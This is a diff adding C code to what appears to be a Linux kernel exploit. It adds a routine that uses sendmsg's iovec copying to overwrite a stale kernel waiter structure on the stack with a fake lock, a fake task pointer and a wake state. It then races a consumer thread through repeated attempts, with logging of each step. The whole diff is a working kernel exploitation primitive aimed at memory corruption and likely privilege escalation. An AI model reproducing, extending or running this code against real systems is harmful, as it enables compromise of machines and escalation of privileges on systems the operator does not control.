@@ -290,6 +290,136 @@ out:
           route_last_errno);
 }
 
+/* sendmsg iovec route: __sys_sendmsg zero-initialises its msghdr and its
+ * eight fast iovecs, and together they span the whole stale waiter, so one
+ * sendmsg rewrites it end to end. import_iovec copies the vector before it
+ * validates it, so the kernel pointer in iov[n].iov_base lands first and the
+ * call then unwinds with EFAULT. */
+#define IOV_ROUTE_ATTEMPTS 64
+#define IOV_POST_SEND_HOLD 20000
+
+static int iov_put_waiter(
+    struct iovec *iov, int off, uint64_t value, const char *name) {
+  int byte = iov_waiter_byte(off);
+  if (byte < 0) {
+    pr_warning("iov route cannot place %s waiter_off=0x%x iov_off=%d\n",
+               name, off, active_offsets ? active_offsets->iov_waiter_off : 0);
+    return -1;
+  }
+  if (byte & 15) {
+    /* copy_iovec_from_user() stops at the first negative length, so a kernel
+     * pointer on a length slot cannot be delivered at all. */
+    if ((int64_t)value < 0) {
+      return -1;
+    }
+    iov[byte / 16].iov_len = (size_t)value;
+  } else {
+    iov[byte / 16].iov_base = (void *)(uintptr_t)value;
+  }
+  return byte / 16 + 1;
+}
+
+void do_iov_fake_lock_route(void) {
+  if (!page_base || !fake_lock || !fake_fops) {
+    route_last_step = 50;
+    route_last_errno = 0;
+    pr_error("iov route missing page=%016zx lock=%016zx fops=%016zx\n",
+             page_base, fake_lock, fake_fops);
+    return;
+  }
+
+  struct iovec iov[IOV_ROUTE_FASTIOV];
+  memset(iov, 0, sizeof(iov));
+
+  int segs = iov_put_waiter(iov, FAKE_WAITER_LOCK_OFF, fake_lock, "lock");
+  if (segs < 0) {
+    route_last_step = 51;
+    route_last_errno = 0;
+    return;
+  }
+  int used = iov_put_waiter(iov, FAKE_WAITER_TASK_OFF, fake_task, "task");
+  if (used > segs) segs = used;
+  used = iov_put_waiter(iov, FAKE_WAITER_WAKE_STATE_OFF, 3, "wake_state");
+  if (used > segs) segs = used;
+  used = iov_put_waiter(iov, FAKE_WAITER_WW_CTX_OFF, 0, "ww_ctx");
+  if (used > segs) segs = used;
+
+  int fd = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    route_last_step = 52;
+    route_last_errno = errno;
+    pr_error("iov route socket errno=%d\n", errno);
+    return;
+  }
+
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = iov;
+  msg.msg_iovlen = (size_t)segs;
+
+  pr_info("iov route enter page=%016zx fake_lock=%016zx fake_task=%016zx "
+          "iov_off=%d segs=%d attempts=%d\n",
+          page_base, fake_lock, fake_task,
+          active_offsets->iov_waiter_off, segs, IOV_ROUTE_ATTEMPTS);
+
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  /* the stamp is already on the stack when the consumer runs */
+  atomic_store(&main_route_delay_usec, 0);
+
+  int route_ok = 0;
+  for (int i = 1; i <= IOV_ROUTE_ATTEMPTS && !route_ok; i++) {
+    int calls_before = atomic_load(&consumer_calls);
+    int success_before = atomic_load(&consumer_success);
+
+    errno = 0;
+    ssize_t ret = sendmsg(fd, &msg, MSG_DONTWAIT);
+    int saved_errno = errno;
+    if (ret >= 0 || saved_errno != EFAULT) {
+      /* the vector was accepted, so the kernel pointer never reached the
+       * waiter frame */
+      if (i == 1) {
+        route_last_step = 53;
+        route_last_errno = saved_errno;
+        pr_error("iov route sendmsg ret=%zd errno=%d; vector not rejected\n",
+                 ret, saved_errno);
+        break;
+      }
+      continue;
+    }
+
+    atomic_store(&punch_consume_go, i);
+    for (int spin = 0; spin < IOV_POST_SEND_HOLD; spin++) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    tcp_wait_for_consumer_idle();
+
+    int calls = atomic_load(&consumer_calls);
+    int success = atomic_load(&consumer_success);
+    if (calls <= calls_before || success <= success_before) {
+      if ((i % 16) == 0) {
+        pr_info("iov route seq=%d calls=%d success=%d\n", i, calls, success);
+      }
+      continue;
+    }
+    route_ok = 1;
+    route_last_step = 0;
+    route_last_errno = 0;
+  }
+
+  atomic_store(&punch_consume_go, 0);
+  atomic_store(&punch_consume_stop, 1);
+  close(fd);
+  if (!route_ok && route_last_step == 0) {
+    route_last_step = 54;
+  }
+  pr_info("iov route done=%d calls=%d success=%d step=%d errno=%d\n",
+          route_ok, atomic_load(&consumer_calls),
+          atomic_load(&consumer_success), route_last_step, route_last_errno);
+}
+
 static int route_delay_usec(int attempt) {
   (void)attempt;
   /* Both routes: let select/pselect establish its frame and stamp the
